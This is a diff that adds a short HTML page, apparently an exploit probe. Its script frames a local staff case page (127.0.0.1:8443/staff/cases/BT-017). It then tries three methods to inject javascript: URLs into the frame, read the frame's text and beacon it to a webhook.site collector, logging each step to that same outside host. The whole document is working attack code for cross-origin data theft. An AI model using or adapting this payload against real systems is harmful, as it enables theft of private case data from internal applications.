@@ -1,0 +1,21 @@
+<!doctype html><html><head><title>p9</title></head><body>p9
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+var C="https://127.0.0.1:8443/staff/cases/BT-017";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,900));}catch(e){}}
+b("start9","1");
+function js(tag){return "javascript:(function(){try{var d=document.body?document.body.innerText:'NODOM';new Image().src='"+H+"/r?k="+tag+"&v='+encodeURIComponent(d.slice(0,900));}catch(e){new Image().src='"+H+"/r?k="+tag+"_E&v='+encodeURIComponent(e.message);}})()";}
+var f=document.createElement("iframe");
+f.src=C;
+f.onload=function(){
+  b("iframe_loaded","1");
+  try{ f.contentWindow.location.href = js("js_href"); b("set_href","no-throw"); }catch(e){ b("set_href_E", e.name+":"+e.message); }
+  setTimeout(function(){
+    try{ f.src = js("js_src"); b("set_src","no-throw"); }catch(e){ b("set_src_E", e.name+":"+e.message); }
+  }, 1200);
+  setTimeout(function(){
+    try{ f.contentWindow.location.replace(js("js_replace")); b("replace","no-throw"); }catch(e){ b("replace_E", e.name+":"+e.message); }
+  }, 2400);
+};
+document.body.append(f);
+</script></body></html>
